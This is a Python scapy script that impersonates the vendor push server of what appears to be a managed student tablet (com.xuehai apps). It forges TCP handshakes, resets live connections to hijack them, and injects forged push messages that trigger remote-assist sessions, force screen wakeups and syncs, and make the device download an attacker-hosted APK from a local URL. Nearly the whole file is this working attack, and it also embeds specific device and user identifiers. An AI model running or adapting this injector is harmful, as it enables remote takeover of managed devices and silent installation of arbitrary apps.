# -*- coding: utf-8 -*-
"""np3200push.py -- userland TCP responder on cloud:3200 + DOWNLINK MESSAGE injector.

Why: the 3200 channel is the com.xuehai.message.sdk push TCP long connection.
PushClient.onReceiver dispatches by header cmd; cmd=0x03 -> Message.decode ->
dealMessage -> PushActionHelper.ACTION_MESSAGE -> LauncherPushService.
disposeMessage("assist-notify", payload) -> AssistModel.sendAssistMessage ->
AssistService.assistNotify -> startAssist(). That is a fully server-side trigger:
no user interaction at all.

Frame format (reverse engineered, verified against two real captured frames):
  [0]=0x09 magic  [1]=version  [2]=cmd  [3..3+n]=length
  n = (byte3>>6)&3 extra length bytes
  value = ((byte3&0x3F) << (8*n)) | bigendian(extra bytes)
  value = contentLen + 3
  total = 4 + n + contentLen

MESSAGE content (java ByteBuffer, BIG_ENDIAN):
  mode    : 1 byte
  count   : 2 bytes (short)
  entries : count * [ msgId:int64 | contentLen:int32 | content:utf8 ]

Extra: if we join a flow that is already established (no SYN seen), we RST it
so the pad reconnects and we own the sequence space from SYN on.

Usage: pythonw np3200push.py [watch_seconds]
"""
import sys, os, time, random, datetime, threading, json, struct
import warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, IP, TCP, Raw, conf, AsyncSniffer
from scapy.arch.windows import get_windows_if_list

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cloud_3200 import classify_frame, REG_RESP, HB_RESP  # noqa: E402

PAD_MAC = "80:20:fd:8b:4b:fa"
ICS_MAC = "8c:81:2b:20:7b:42"
IFINDEX = 26
PORT = 3200
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 600
BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "np3200push.log")

# ---- push payload ------------------------------------------------------
ASSIST_ID = os.environ.get("PUSH_ASSIST_ID") or "assist_marvis_0001"
USER_ID = os.environ.get("PUSH_USER_ID") or "2112229"
CLIENT_ID = os.environ.get("PUSH_CLIENT_ID") or "3f025ad519274a6795aaf5161efd7726"
DEVICE_ID = os.environ.get("PUSH_DEVICE_ID") or "R52N9067SSF"
ENABLE_PUSH = os.environ.get("PUSH_ENABLE", "1") != "0"
# Runtime control channel: writing a msgType into this file makes the running
# injector fire exactly one probe at the current sequence frontier, so probes
# can be triggered from a non-elevated shell without restarting anything.
CMD_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "inject_cmd.txt")
_cmd = {"mt": 0.0}


def _detect_pad(mac=PAD_MAC):
    import re as _re
    import subprocess as _sp
    want = mac.replace(":", "-").lower()
    try:
        out = _sp.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = _re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return "192.168.137.13"


PAD = _detect_pad()
_pad_ttl = {"t": 0.0}
_sock = None
flows = {}
stat = {"syn": 0, "est": 0, "rx_frames": 0, "tx_frames": 0, "dup": 0,
        "unknown": 0, "push_sent": 0, "push_acked": 0, "rst": 0}


def pad_now():
    global PAD
    if time.time() - _pad_ttl["t"] > 20:
        _pad_ttl["t"] = time.time()
        new = _detect_pad()
        if new != PAD:
            wlog("PAD drift: %s -> %s" % (PAD, new))
            PAD = new
    return PAD


def wlog(s):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], s)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line, flush=True)


def iface_name():
    for d in get_windows_if_list():
        if d.get("index") == IFINDEX:
            return r"\Device\NPF_" + d["guid"]


def send(frame):
    global _sock
    if _sock is None:
        _sock = conf.L2socket(iface=iface_name())
    _sock.send(frame)


def emit(dst_ip, sport, dport, flags, seq, ack, payload=b""):
    pkt = (Ether(dst=PAD_MAC, src=ICS_MAC) /
           IP(src=dst_ip, dst=PAD, ttl=64) /
           TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack, window=64240))
    if payload:
        pkt = pkt / Raw(payload)
    send(pkt)
    stat["tx_frames"] += 1


# ---- frame building ----------------------------------------------------
def build_frame(cmd, content, version=1):
    value = len(content) + 3
    n = 0
    v = value >> 6
    while v > 0:
        n += 1
        v >>= 8
    out = bytearray([0x09, version & 0xFF, cmd & 0xFF])
    out.append(((n & 3) << 6) | ((value >> (8 * n)) & 0x3F))
    for i in range(n - 1, -1, -1):
        out.append((value >> (8 * i)) & 0xFF)
    out += content
    return bytes(out)


def build_message(msgid, content_json):
    body = content_json.encode("utf-8")
    content = bytearray()
    content.append(0x00)                       # mode
    content += struct.pack(">H", 1)            # count
    content += struct.pack(">q", msgid)        # msgId
    content += struct.pack(">i", len(body))    # contentLen
    content += body
    return build_frame(0x03, bytes(content), version=1)


def push_frame(msgid, msgtype, payload):
    push = {"appId": "zty_stu", "subAppId": "zty_stu", "clientId": CLIENT_ID,
            "msgId": str(msgid), "msgType": msgtype, "subMsgType": msgtype,
            "payload": payload, "userId": USER_ID, "style": 0}
    # PushJsonUtil.objToJson(List<Message$Entry>) -> [{"content":..,"msgId":..}]
    entries = [{"msgId": msgid, "content": json.dumps(push, ensure_ascii=False)}]
    return build_message(msgid, json.dumps(entries, ensure_ascii=False))


def assist_notify_push(msgid):
    notify = {"assistId": ASSIST_ID, "hidden": 1, "operate": "ENTRY",
              "deviceId": DEVICE_ID, "userId": int(USER_ID)}
    return push_frame(msgid, "assist-notify", json.dumps(notify, ensure_ascii=False))


def wakeup_push(msgid):
    """dealNotificationMessage -> SpecialApp.wakeUp(ctx, pkg, action):
    Intent(action).setFlags(0x10a00000) + startActivity -> visible on screen.
    com.xuehai.settings/SettingWlanAct is exported with action
    com.xuehai.settings.wlan (AndroidManifest.xml of com.xuehai.settings)."""
    n = {"packageName": "com.xuehai.settings", "title": "MARVIS-WAKEUP",
         "content": "wakeup", "notifyId": 99005, "userId": int(USER_ID),
         "iconUrl": "", "payload": "", "resident": 0, "screenOn": True,
         "hasRead": 0, "wakeUpAction": "com.xuehai.settings.wlan"}
    return push_frame(msgid, "app-notification", json.dumps(n, ensure_ascii=False))


def notification_push(msgid):
    n = {"packageName": "com.xuehai.settings", "title": "MARVIS-CANARY",
         "content": "canary", "notifyId": 99003, "userId": int(USER_ID),
         "iconUrl": "", "payload": "", "resident": 0, "screenOn": False,
         "hasRead": 0, "wakeUpAction": ""}
    return push_frame(msgid, "app-notification", json.dumps(n, ensure_ascii=False))


def control_service_push(msgid):
    return push_frame(msgid, "control-service", "")


def sync_message_push(msgid):
    # ResourceUpdateManager.onReceiverMessage(J): only acts when version > local
    # MAX_LONG guarantees > any stored local version -> forces sendDelayTask(2,0) -> HTTP
    return push_frame(msgid, "app-syncMessage", "9223372036854775807")


UPGRADE_URL = os.environ.get("UPGRADE_URL") or "http://192.168.137.1:8080/agent.apk"
UPGRADE_MD5 = os.environ.get("UPGRADE_MD5") or "2c44a3a421a1e26fcd5405e890c583ba"
UPGRADE_PKG = os.environ.get("UPGRADE_PKG") or "com.olive.agent"
UPGRADE_VER = int(os.environ.get("UPGRADE_VER") or "9999")


def upgrade_prepare_push(msgid):
    # disposeMessage->app-upgrade-prepare -> PrepareAppUpgradeNotification
    # -> transformAppUpdateTask() -> AppUpdateModel.preDownloadApp(task)
    # -> AppUpdateManager.preDownloadApp: gate BoxManager.isBoxEnable() &&
    #    SysAuthority.getPreDownloadApp() -> realDownloadApp -> url/md5 fully ours
    n = {"appId": "zty_stu", "md5": UPGRADE_MD5, "packageName": UPGRADE_PKG,
         "taskId": str(msgid), "url": UPGRADE_URL, "userId": int(USER_ID),
         "versionCode": UPGRADE_VER}
    return push_frame(msgid, "app-upgrade-prepare", json.dumps(n, ensure_ascii=False))


def frame_for(name, mid):
    if name == "assist-notify":
        return assist_notify_push(mid)
    if name == "app-upgrade-prepare":
        return upgrade_prepare_push(mid)
    if name == "wakeup":
        return wakeup_push(mid)
    if name == "app-notification":
        return notification_push(mid)
    if name == "control-service":
        return control_service_push(mid)
    if name == "app-syncMessage":
        return sync_message_push(mid)
    return push_frame(mid, name, "")


PROBE_ORDER = (os.environ.get("PUSH_PROBES") or "assist-notify").split(",")


def build_probe_burst():
    """One TCP segment carrying several frames -> one round of dispatch each."""
    blob = b""
    ids = []
    base = int(time.time() * 1000)
    for i, name in enumerate(PROBE_ORDER):
        name = name.strip()
        if not name or name == "none":
            continue
        mid = base + i
        ids.append((name, mid))
        fr = frame_for(name, mid)
        blob += fr
    return blob, ids, base


# ---- packet handling ---------------------------------------------------
def on_pkt(p):
    try:
        if not (p.haslayer(TCP) and p.haslayer(IP)):
            return
        ip, t = p[IP], p[TCP]
        pad_now()
        if ip.src != PAD or t.dport != PORT:
            return
        cloud = ip.dst
        key = (cloud, t.sport)
        f = flows.get(key)
        pl = bytes(t.payload) if t.payload else b""

        if t.flags & 0x02 and not t.flags & 0x10:  # SYN
            isn = random.randint(0x40000000, 0x7FFFFFFF)
            flows[key] = {"next": (t.seq + 1) & 0xFFFFFFFF,
                          "mine": (isn + 1) & 0xFFFFFFFF,
                          "isn": isn, "est": False, "rx": 0, "log_buf": b"",
                          "inj": None}
            stat["syn"] += 1
            emit(cloud, PORT, t.sport, "SA", isn, (t.seq + 1) & 0xFFFFFFFF)
            wlog("SYN %s:%d <- %s:%d -> SYNACK isn=%08x (#%d)" %
                 (cloud, PORT, PAD, t.sport, isn, stat["syn"]))
            return

        if f is None:
            # joined mid-flow: own nothing, force the pad to reconnect
            if not (t.flags & 0x04):
                emit(cloud, PORT, t.sport, "RA", t.ack, t.seq)
                stat["rst"] += 1
                wlog("STRAY flow %s:%d <- %s:%d flags=%s -> RST(a=%08x) force reconnect" %
                     (cloud, PORT, PAD, t.sport, t.flags, t.ack))
            return

        if t.flags & 0x04:
            wlog("RST from pad %s:%d (flow drop)" % (PAD, t.sport))
            flows.pop(key, None)
            return

        acked_us = (t.ack == f["mine"]) or ((t.ack - f["mine"]) & 0xFFFFFFFF) < 0x80000000
        if not f["est"] and t.flags & 0x10 and acked_us:
            f["est"] = True
            stat["est"] += 1
            wlog("ESTABLISHED %s:%d <-> %s:%d" % (cloud, PORT, PAD, t.sport))

        if pl:
            seq = t.seq
            if ((seq - f["next"]) & 0xFFFFFFFF) > 0x30000000:
                stat["dup"] += 1
                emit(cloud, PORT, t.sport, "A", f["mine"], f["next"])
                wlog("DUP seq=%08x (expect %08x) len=%d -> ACK" % (seq, f["next"], len(pl)))
            else:
                if seq != f["next"]:
                    wlog("GAP seq=%08x expect=%08x len=%d" % (seq, f["next"], len(pl)))
                f["next"] = (seq + len(pl)) & 0xFFFFFFFF
                f["rx"] += len(pl)
                f["log_buf"] += pl
                stat["rx_frames"] += 1
                kind, resp = classify_frame(f["log_buf"])
                wlog("RX %s:%d <- %s:%d len=%d kind=%s hex=%s" %
                     (cloud, PORT, PAD, t.sport, len(pl), kind, pl.hex()[:120]))
                emit(cloud, PORT, t.sport, "A", f["mine"], f["next"])
                if resp is not None:
                    emit(cloud, PORT, t.sport, "PA", f["mine"], f["next"], resp)
                    f["mine"] = (f["mine"] + len(resp)) & 0xFFFFFFFF
                    wlog("TX -> pad kind=%s %dB hex=%s" % (kind, len(resp), resp.hex()[:120]))
                    if kind == "reg" and ENABLE_PUSH:
                        # send the downlink push right behind AUTH_FB and take
                        # its sequence space so later responses stay in order
                        frame, ids, base = build_probe_burst()
                        if not frame:
                            f["inj"] = None
                        else:
                            inj_seq = f["mine"]
                            emit(cloud, PORT, t.sport, "PA", inj_seq, f["next"], frame)
                            f["mine"] = (f["mine"] + len(frame)) & 0xFFFFFFFF
                            stat["push_sent"] += 1
                            f["inj"] = {"data": frame, "seq": inj_seq, "mid": base,
                                        "t": time.time(), "tries": 0}
                            wlog("PUSH TX %s %dB seq=%08x next=%08x hex=%s" %
                                 (ids, len(frame), inj_seq, f["mine"], frame.hex()[:160]))
                else:
                    wlog("NO-RESP kind=%s" % kind)
                f["log_buf"] = b""
        elif t.flags & 0x01:  # FIN
            emit(cloud, PORT, t.sport, "FA", f["mine"], (t.seq + 1) & 0xFFFFFFFF)
            wlog("FIN from pad -> FINACK, drop")
            flows.pop(key, None)
            return
        else:
            emit(cloud, PORT, t.sport, "A", f["mine"], f["next"])

        # runtime command channel: fire one probe on demand
        maybe_cmd(cloud, t.sport, f)

        # injection retransmit / ack tracking (per flow)
        inj_flush(cloud, t.sport, f, t)
    except Exception as e:
        wlog("ERR %s %s" % (type(e).__name__, e))


def maybe_cmd(cloud, sport, f):
    """Fire one push probe when inject_cmd.txt changes (mtime acts as the trigger)."""
    try:
        mt = os.stat(CMD_FILE).st_mtime
    except Exception:
        return
    if mt <= _cmd["mt"]:
        return
    _cmd["mt"] = mt
    try:
        with open(CMD_FILE, "r", encoding="utf-8") as fh:
            txt = fh.read().strip()
    except Exception:
        return
    if not txt or txt == "none":
        wlog("CMD none")
        return
    mid = int(time.time() * 1000)
    fr = frame_for(txt, mid)
    seq = f["mine"]
    emit(cloud, PORT, sport, "PA", seq, f["next"], fr)
    f["mine"] = (f["mine"] + len(fr)) & 0xFFFFFFFF
    stat["push_sent"] += 1
    f["inj"] = {"data": fr, "seq": seq, "mid": mid, "t": time.time(), "tries": 0}
    wlog("CMD PUSH %s msgId=%d %dB seq=%08x next=%08x hex=%s" %
         (txt, mid, len(fr), seq, f["mine"], fr.hex()[:120]))


def inj_flush(cloud, sport, f, t):
    inj = f.get("inj")
    if not inj:
        return
    end = (inj["seq"] + len(inj["data"])) & 0xFFFFFFFF
    # pad acked our push?
    if (t.ack == end) or ((t.ack - end) & 0xFFFFFFFF) < 0x80000000:
        if not inj.get("acked"):
            inj["acked"] = True
            stat["push_acked"] += 1
            wlog("PUSH ACKED msgId=%d (pad rcv_nxt=%08x)" % (inj["mid"], t.ack))
        f["inj"] = None
        return
    if time.time() - inj["t"] > 1.5:
        if inj["tries"] >= 6:
            wlog("PUSH GIVEUP msgId=%d tries=%d" % (inj["mid"], inj["tries"]))
            f["inj"] = None
            return
        inj["tries"] += 1
        inj["t"] = time.time()
        emit(cloud, PORT, sport, "PA", inj["seq"], f["next"], inj["data"])
        stat["push_sent"] += 1
        wlog("PUSH RETX #%d msgId=%d seq=%08x %dB" %
             (inj["tries"], inj["mid"], inj["seq"], len(inj["data"])))


def main():
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("\n===== np3200push start %s watch=%ds push=%s assistId=%s =====\n" %
                (datetime.datetime.now(), WATCH, ENABLE_PUSH, ASSIST_ID))
    wlog("iface=%s pad=%s port=%d push=%s" % (iface_name(), PAD, PORT, ENABLE_PUSH))
    sn = AsyncSniffer(iface=iface_name(), store=False, prn=on_pkt, filter="ip")
    sn.start()
    t0 = time.time()
    while time.time() - t0 < WATCH:
        time.sleep(5)
        wlog("[stat] %s" % stat)
    sn.stop()
    wlog("[end] %s" % stat)


if __name__ == "__main__":
    main()
